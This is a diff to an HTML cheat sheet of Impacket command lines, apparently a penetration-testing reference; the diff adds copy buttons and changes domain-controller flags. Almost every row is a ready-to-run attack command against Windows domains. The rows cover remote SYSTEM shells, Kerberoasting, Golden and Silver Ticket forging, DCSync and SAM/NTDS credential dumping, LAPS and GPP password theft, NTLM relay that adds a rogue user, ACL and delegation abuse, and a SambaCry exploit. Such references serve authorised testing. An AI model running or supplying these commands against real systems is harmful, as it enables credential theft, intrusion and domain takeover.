+  <tr><td class="tool">impacket-net</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 user -list</td><td class="desc">Remote net.exe equivalent</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-getArch</td><td class="cmd">-target 192.168.1.10</td><td class="desc">Detect remote OS architecture</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Exchange</h2>
 <table>
-  <tr><td class="tool">impacket-exchanger</td><td class="cmd">domain.local/user:Pass@mail.domain.local nspi dump-tables -name GAL</td><td class="desc">Dump Exchange address book via RPC</td></tr>
+  <tr><td class="tool">impacket-exchanger</td><td class="cmd">domain.local/user:Pass@mail.domain.local nspi dump-tables -name GAL</td><td class="desc">Dump Exchange address book via RPC</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Exploits</h2>
 <table>
-  <tr><td class="tool">impacket-goldenPac</td><td class="cmd">domain.local/user:Pass@dc01.domain.local</td><td class="desc">MS14-068 Kerberos privesc</td></tr>
-  <tr><td class="tool">impacket-sambaPipe</td><td class="cmd">-dc-ip 192.168.1.1 domain.local/user:Pass -so /path/to/payload.so</td><td class="desc">CVE-2017-7494 (SambaCry)</td></tr>
+  <tr><td class="tool">impacket-goldenPac</td><td class="cmd">domain.local/user:Pass@dc01.domain.local</td><td class="desc">MS14-068 Kerberos privesc</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-sambaPipe</td><td class="cmd">-dc-host 192.168.1.1 -ns 192.168.1.1 domain.local/user:Pass -so /path/to/payload.so</td><td class="desc">CVE-2017-7494 (SambaCry)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Offline / File Format Tools</h2>
 <table>
-  <tr><td class="tool">impacket-esentutl</td><td class="cmd">ntds.dit dump -table datatable</td><td class="desc">Parse ESE/JET database (NTDS.dit)</td></tr>
-  <tr><td class="tool">impacket-ntfs-read</td><td class="cmd">"\C:" -extract "\windows\system32\config\sam"</td><td class="desc">Browse/extract from NTFS volume</td></tr>
-  <tr><td class="tool">impacket-registry-read</td><td class="cmd">SYSTEM walk</td><td class="desc">Parse offline registry hive</td></tr>
+  <tr><td class="tool">impacket-esentutl</td><td class="cmd">ntds.dit dump -table datatable</td><td class="desc">Parse ESE/JET database (NTDS.dit)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-ntfs-read</td><td class="cmd">"\C:" -extract "\windows\system32\config\sam"</td><td class="desc">Browse/extract from NTFS volume</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-registry-read</td><td class="cmd">SYSTEM walk</td><td class="desc">Parse offline registry hive</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Misc / Network</h2>
 <table>
-  <tr><td class="tool">impacket-rdp_check</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Validate creds via RDP/CredSSP</td></tr>
-  <tr><td class="tool">impacket-mqtt_check</td><td class="cmd">domain/user:Pass@192.168.1.10</td><td class="desc">MQTT login check</td></tr>
-  <tr><td class="tool">impacket-ping</td><td class="cmd">192.168.1.10</td><td class="desc">IPv4 ICMP ping</td></tr>
-  <tr><td class="tool">impacket-ping6</td><td class="cmd">fe80::1</td><td class="desc">IPv6 ICMP ping</td></tr>
-  <tr><td class="tool">impacket-sniff</td><td class="cmd">-i eth0</td><td class="desc">Simple packet sniffer</td></tr>
-  <tr><td class="tool">impacket-sniffer</td><td class="cmd">-i eth0</td><td class="desc">Alternative packet sniffer</td></tr>
-  <tr><td class="tool">impacket-split</td><td class="cmd">-f capture.pcap -o /output/dir</td><td class="desc">Split pcap by stream</td></tr>
+  <tr><td class="tool">impacket-rdp_check</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Validate creds via RDP/CredSSP</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-mqtt_check</td><td class="cmd">domain/user:Pass@192.168.1.10</td><td class="desc">MQTT login check</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-ping</td><td class="cmd">192.168.1.10</td><td class="desc">IPv4 ICMP ping</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-ping6</td><td class="cmd">fe80::1</td><td class="desc">IPv6 ICMP ping</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-sniff</td><td class="cmd">-i eth0</td><td class="desc">Simple packet sniffer</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-sniffer</td><td class="cmd">-i eth0</td><td class="desc">Alternative packet sniffer</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-split</td><td class="cmd">-f capture.pcap -o /output/dir</td><td class="desc">Split pcap by stream</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 </div><!-- /kali -->
 
-
-<!-- ══════════════ PYTHON TAB ══════════════ -->
 <div id="tab-py" class="tab">
 
 <h2>Remote Execution</h2>
 <table>
-  <tr><td class="tool">python3 psexec.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">SYSTEM shell via SVCManager</td></tr>
-  <tr><td class="tool">python3 wmiexec.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via WMI, no binary drop</td></tr>
-  <tr><td class="tool">python3 smbexec.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via temp service, no upload</td></tr>
-  <tr><td class="tool">python3 atexec.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 "whoami"</td><td class="desc">Execute via Task Scheduler</td></tr>
-  <tr><td class="tool">python3 dcomexec.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via DCOM objects</td></tr>
+  <tr><td class="tool">python3 psexec.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">SYSTEM shell via SVCManager</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 wmiexec.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via WMI, no binary drop</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 smbexec.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via temp service, no upload</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 atexec.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 "whoami"</td><td class="desc">Execute via Task Scheduler</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 dcomexec.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via DCOM objects</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Kerberos Attacks</h2>
 <table>
-  <tr><td class="tool">python3 GetUserSPNs.py</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1 -request -outputfile tgs.hash</td><td class="desc">Kerberoasting (hashcat -m 13100)</td></tr>
-  <tr><td class="tool">python3 GetNPUsers.py</td><td class="cmd">domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash -dc-ip 192.168.1.1</td><td class="desc">AS-REP Roast (hashcat -m 18200)</td></tr>
-  <tr><td class="tool">python3 getTGT.py</td><td class="cmd">domain.local/user:Pass</td><td class="desc">Request TGT → saves .ccache</td></tr>
-  <tr><td class="tool">python3 getTGT.py</td><td class="cmd">domain.local/user -hashes :NTHASH</td><td class="desc">Overpass-the-Hash / PTK</td></tr>
-  <tr><td class="tool">python3 getST.py</td><td class="cmd">-spn cifs/target.domain.local -impersonate Administrator domain.local/svc:Pass</td><td class="desc">S4U2self / delegation abuse</td></tr>
-  <tr><td class="tool">python3 getPac.py</td><td class="cmd">-targetUser Administrator domain.local/user:Pass</td><td class="desc">Retrieve PAC of target user</td></tr>
-  <tr><td class="tool">python3 ticketer.py</td><td class="cmd">-nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator</td><td class="desc">Forge Golden Ticket (TGT)</td></tr>
-  <tr><td class="tool">python3 ticketer.py</td><td class="cmd">-nthash SVC_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target Administrator</td><td class="desc">Forge Silver Ticket (TGS)</td></tr>
-  <tr><td class="tool">python3 ticketConverter.py</td><td class="cmd">ticket.kirbi ticket.ccache</td><td class="desc">kirbi (Mimikatz) ↔ ccache</td></tr>
-  <tr><td class="tool">python3 describeTicket.py</td><td class="cmd">ticket.ccache</td><td class="desc">Parse and describe a Kerberos ticket</td></tr>
-  <tr><td class="tool">python3 raiseChild.py</td><td class="cmd">-target-exec 192.168.1.10 domain.local/childadmin:Pass</td><td class="desc">Child domain → forest DA privesc</td></tr>
-  <tr><td class="tool">python3 keylistattack.py</td><td class="cmd">-rodcNo 502 -rodcKey KEY domain.local/user:Pass@dc01</td><td class="desc">RODC KERB-KEY-LIST-REQ dump</td></tr>
-  <tr><td class="tool">python3 kintercept.py</td><td class="cmd">-kdc 192.168.1.1 -listen 0.0.0.0</td><td class="desc">Intercept krb5 / test KDC S4U2Self</td></tr>
+  <tr><td class="tool">python3 GetUserSPNs.py</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1 -request -outputfile tgs.hash</td><td class="desc">Kerberoasting (hashcat -m 13100)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 GetNPUsers.py</td><td class="cmd">domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">AS-REP Roast (hashcat -m 18200)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 getTGT.py</td><td class="cmd">domain.local/user:Pass</td><td class="desc">Request TGT → saves .ccache</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 getTGT.py</td><td class="cmd">domain.local/user -hashes :NTHASH</td><td class="desc">Overpass-the-Hash / PTK</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 getST.py</td><td class="cmd">-spn cifs/target.domain.local -impersonate Administrator domain.local/svc:Pass</td><td class="desc">S4U2self / delegation abuse</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 getPac.py</td><td class="cmd">-targetUser Administrator domain.local/user:Pass</td><td class="desc">Retrieve PAC of target user</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 ticketer.py</td><td class="cmd">-nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator</td><td class="desc">Forge Golden Ticket (TGT)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 ticketer.py</td><td class="cmd">-nthash SVC_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target Administrator</td><td class="desc">Forge Silver Ticket (TGS)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 ticketConverter.py</td><td class="cmd">ticket.kirbi ticket.ccache</td><td class="desc">kirbi (Mimikatz) ↔ ccache</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 describeTicket.py</td><td class="cmd">ticket.ccache</td><td class="desc">Parse and describe a Kerberos ticket</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 raiseChild.py</td><td class="cmd">-target-exec 192.168.1.10 domain.local/childadmin:Pass</td><td class="desc">Child domain → forest DA privesc</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 keylistattack.py</td><td class="cmd">-rodcNo 502 -rodcKey KEY domain.local/user:Pass@dc01</td><td class="desc">RODC KERB-KEY-LIST-REQ dump</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 kintercept.py</td><td class="cmd">-kdc 192.168.1.1 -listen 0.0.0.0</td><td class="desc">Intercept krb5 / test KDC S4U2Self</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Credential Dumping</h2>
 <table>
-  <tr><td class="tool">python3 secretsdump.py</td><td class="cmd">DOMAIN/Admin:Pass@192.168.1.1</td><td class="desc">DCSync — dump all hashes from DC</td></tr>
-  <tr><td class="tool">python3 secretsdump.py</td><td class="cmd">DOMAIN/Admin:Pass@192.168.1.1 -just-dc-user krbtgt</td><td class="desc">DCSync single user</td></tr>
-  <tr><td class="tool">python3 secretsdump.py</td><td class="cmd">-sam SAM -system SYSTEM -security SECURITY local</td><td class="desc">Offline SAM/LSA from reg hives</td></tr>
-  <tr><td class="tool">python3 secretsdump.py</td><td class="cmd">-ntds ntds.dit -system SYSTEM local</td><td class="desc">Offline NTDS.dit dump</td></tr>
-  <tr><td class="tool">python3 DumpNTLMInfo.py</td><td class="cmd">192.168.1.10</td><td class="desc">NTLM info probe — no auth needed</td></tr>
-  <tr><td class="tool">python3 dpapi.py</td><td class="cmd">masterkey -file key.pvk -sid S-1-5-21-... -password Pass</td><td class="desc">Decrypt DPAPI masterkeys/blobs</td></tr>
-  <tr><td class="tool">python3 mimikatz.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Remote Mimikatz-like RPC interface</td></tr>
-  <tr><td class="tool">python3 regsecrets.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Extract LSA secrets via remote registry</td></tr>
-  <tr><td class="tool">python3 samedit.py</td><td class="cmd">-sam SAM -system SYSTEM local</td><td class="desc">Edit local SAM password hashes offline</td></tr>
+  <tr><td class="tool">python3 secretsdump.py</td><td class="cmd">DOMAIN/Admin:Pass@192.168.1.1</td><td class="desc">DCSync — dump all hashes from DC</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 secretsdump.py</td><td class="cmd">DOMAIN/Admin:Pass@192.168.1.1 -just-dc-user krbtgt</td><td class="desc">DCSync single user</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 secretsdump.py</td><td class="cmd">-sam SAM -system SYSTEM -security SECURITY local</td><td class="desc">Offline SAM/LSA from reg hives</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 secretsdump.py</td><td class="cmd">-ntds ntds.dit -system SYSTEM local</td><td class="desc">Offline NTDS.dit dump</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 DumpNTLMInfo.py</td><td class="cmd">192.168.1.10</td><td class="desc">NTLM info probe — no auth needed</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 dpapi.py</td><td class="cmd">masterkey -file key.pvk -sid S-1-5-21-... -password Pass</td><td class="desc">Decrypt DPAPI masterkeys/blobs</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 mimikatz.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Remote Mimikatz-like RPC interface</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 regsecrets.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Extract LSA secrets via remote registry</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 samedit.py</td><td class="cmd">-sam SAM -system SYSTEM local</td><td class="desc">Edit local SAM password hashes offline</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>SMB &amp; File Operations</h2>
 <table>
-  <tr><td class="tool">python3 smbclient.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Interactive SMB shell (shares, get, put)</td></tr>
-  <tr><td class="tool">python3 smbserver.py</td><td class="cmd">share . -smb2support</td><td class="desc">Host current dir as SMB share</td></tr>
-  <tr><td class="tool">python3 smbserver.py</td><td class="cmd">share /opt/files -smb2support -username u -password p</td><td class="desc">Authenticated share</td></tr>
-  <tr><td class="tool">python3 smbpasswd.py</td><td class="cmd">DOMAIN/user:OldPass@192.168.1.10 -newpass NewPass1!</td><td class="desc">Change SMB password remotely</td></tr>
-  <tr><td class="tool">python3 karmaSMB.py</td><td class="cmd">/path/to/file.exe -smb2support</td><td class="desc">Serve arbitrary file for any UNC path</td></tr>
-  <tr><td class="tool">python3 attrib.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -path "C:\Users\user\file.txt"</td><td class="desc">Read/set SMB file attributes remotely</td></tr>
-  <tr><td class="tool">python3 filetime.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -path "C:\file.txt"</td><td class="desc">Inspect/update SMB file timestamps</td></tr>
+  <tr><td class="tool">python3 smbclient.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Interactive SMB shell (shares, get, put)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 smbserver.py</td><td class="cmd">share . -smb2support</td><td class="desc">Host current dir as SMB share</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 smbserver.py</td><td class="cmd">share /opt/files -smb2support -username u -password p</td><td class="desc">Authenticated share</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 smbpasswd.py</td><td class="cmd">DOMAIN/user:OldPass@192.168.1.10 -newpass NewPass1!</td><td class="desc">Change SMB password remotely</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 karmaSMB.py</td><td class="cmd">/path/to/file.exe -smb2support</td><td class="desc">Serve arbitrary file for any UNC path</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 attrib.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -path "C:\Users\user\file.txt"</td><td class="desc">Read/set SMB file attributes remotely</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 filetime.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -path "C:\file.txt"</td><td class="desc">Inspect/update SMB file timestamps</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>AD Enumeration</h2>
 <table>
-  <tr><td class="tool">python3 GetADUsers.py</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1 -all</td><td class="desc">Enumerate all domain users</td></tr>
-  <tr><td class="tool">python3 GetADComputers.py</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1 -resolveIP</td><td class="desc">Enumerate domain computers</td></tr>
-  <tr><td class="tool">python3 GetLAPSPassword.py</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1</td><td class="desc">Dump LAPS passwords via LDAP</td></tr>
-  <tr><td class="tool">python3 lookupsid.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">SID brute-force — enumerate users</td></tr>
-  <tr><td class="tool">python3 samrdump.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Enumerate users/shares via SAMR</td></tr>
-  <tr><td class="tool">python3 netview.py</td><td class="cmd">domain.local/user:Pass -targets hosts.txt</td><td class="desc">Track active sessions across hosts</td></tr>
-  <tr><td class="tool">python3 findDelegation.py</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1</td><td class="desc">List all delegation relationships</td></tr>
-  <tr><td class="tool">python3 Get-GPPPassword.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Extract/decrypt GPP passwords</td></tr>
-  <tr><td class="tool">python3 machine_role.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Get machine role (DC, member, etc.)</td></tr>
-  <tr><td class="tool">python3 CheckLDAPStatus.py</td><td class="cmd">192.168.1.1</td><td class="desc">Check LDAP signing + channel binding</td></tr>
+  <tr><td class="tool">python3 GetADUsers.py</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1 -all</td><td class="desc">Enumerate all domain users</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 GetADComputers.py</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1 -resolveIP</td><td class="desc">Enumerate domain computers</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 GetLAPSPassword.py</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">Dump LAPS passwords via LDAP</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 lookupsid.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">SID brute-force — enumerate users</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 samrdump.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Enumerate users/shares via SAMR</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 netview.py</td><td class="cmd">domain.local/user:Pass -targets hosts.txt</td><td class="desc">Track active sessions across hosts</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 findDelegation.py</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">List all delegation relationships</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 Get-GPPPassword.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Extract/decrypt GPP passwords</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 machine_role.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Get machine role (DC, member, etc.)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 CheckLDAPStatus.py</td><td class="cmd">192.168.1.1</td><td class="desc">Check LDAP signing + channel binding</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>NTLM Relay</h2>
 <table>
-  <tr><td class="tool">python3 ntlmrelayx.py</td><td class="cmd">-tf targets.txt -smb2support</td><td class="desc">Relay to targets — auto SAM dump</td></tr>
-  <tr><td class="tool">python3 ntlmrelayx.py</td><td class="cmd">-tf targets.txt -smb2support -c "net user hacker P@ss /add"</td><td class="desc">Relay + execute command</td></tr>
-  <tr><td class="tool">python3 ntlmrelayx.py</td><td class="cmd">-tf targets.txt -smb2support -socks</td><td class="desc">Relay into SOCKS sessions</td></tr>
-  <tr><td class="tool">python3 ntlmrelayx.py</td><td class="cmd">-t ldap://192.168.1.1 -smb2support</td><td class="desc">Relay to LDAP</td></tr>
-  <tr><td class="tool">python3 smbrelayx.py</td><td class="cmd">-h victimIP -c "whoami"</td><td class="desc">CVE-2015-0005 SMB relay</td></tr>
+  <tr><td class="tool">python3 ntlmrelayx.py</td><td class="cmd">-tf targets.txt -smb2support</td><td class="desc">Relay to targets — auto SAM dump</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 ntlmrelayx.py</td><td class="cmd">-tf targets.txt -smb2support -c "net user hacker P@ss /add"</td><td class="desc">Relay + execute command</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 ntlmrelayx.py</td><td class="cmd">-tf targets.txt -smb2support -socks</td><td class="desc">Relay into SOCKS sessions</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 ntlmrelayx.py</td><td class="cmd">-t ldap://192.168.1.1 -smb2support</td><td class="desc">Relay to LDAP</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 smbrelayx.py</td><td class="cmd">-h victimIP -c "whoami"</td><td class="desc">CVE-2015-0005 SMB relay</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>ACL / Ownership Abuse</h2>
 <table>
-  <tr><td class="tool">python3 dacledit.py</td><td class="cmd">-action read -target targetuser DOMAIN/user:Pass -dc-ip 192.168.1.1</td><td class="desc">Read DACLs on AD object</td></tr>
-  <tr><td class="tool">python3 dacledit.py</td><td class="cmd">-action write -rights FullControl -principal attacker -target victim DOMAIN/Admin:Pass -dc-ip 192.168.1.1</td><td class="desc">Grant FullControl on AD object</td></tr>
-  <tr><td class="tool">python3 owneredit.py</td><td class="cmd">-action write -new-owner attacker -target victim DOMAIN/Admin:Pass -dc-ip 192.168.1.1</td><td class="desc">Change owner of AD object</td></tr>
-  <tr><td class="tool">python3 rbcd.py</td><td class="cmd">-action write -delegate-to target$ -delegate-from evil$ DOMAIN/Admin:Pass -dc-ip 192.168.1.1</td><td class="desc">Write msDS-AllowedToActOnBehalfOf</td></tr>
+  <tr><td class="tool">python3 dacledit.py</td><td class="cmd">-action read -target targetuser DOMAIN/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">Read DACLs on AD object</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 dacledit.py</td><td class="cmd">-action write -rights FullControl -principal attacker -target victim DOMAIN/Admin:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">Grant FullControl on AD object</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 owneredit.py</td><td class="cmd">-action write -new-owner attacker -target victim DOMAIN/Admin:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">Change owner of AD object</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 rbcd.py</td><td class="cmd">-action write -delegate-to target$ -delegate-from evil$ DOMAIN/Admin:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">Write msDS-AllowedToActOnBehalfOf</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>MSSQL</h2>
 <table>
-  <tr><td class="tool">python3 mssqlclient.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -windows-auth</td><td class="desc">Windows auth (enable_xp_cmdshell for RCE)</td></tr>
-  <tr><td class="tool">python3 mssqlclient.py</td><td class="cmd">sa:Pass@192.168.1.10</td><td class="desc">SQL auth login</td></tr>
-  <tr><td class="tool">python3 mssqlinstance.py</td><td class="cmd">192.168.1.10</td><td class="desc">Discover MSSQL instance names</td></tr>
-  <tr><td class="tool">python3 checkMSSQLStatus.py</td><td class="cmd">192.168.1.10</td><td class="desc">Check MSSQL service status</td></tr>
+  <tr><td class="tool">python3 mssqlclient.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -windows-auth</td><td class="desc">Windows auth (enable_xp_cmdshell for RCE)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 mssqlclient.py</td><td class="cmd">sa:Pass@192.168.1.10</td><td class="desc">SQL auth login</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 mssqlinstance.py</td><td class="cmd">192.168.1.10</td><td class="desc">Discover MSSQL instance names</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 checkMSSQLStatus.py</td><td class="cmd">192.168.1.10</td><td class="desc">Check MSSQL service status</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
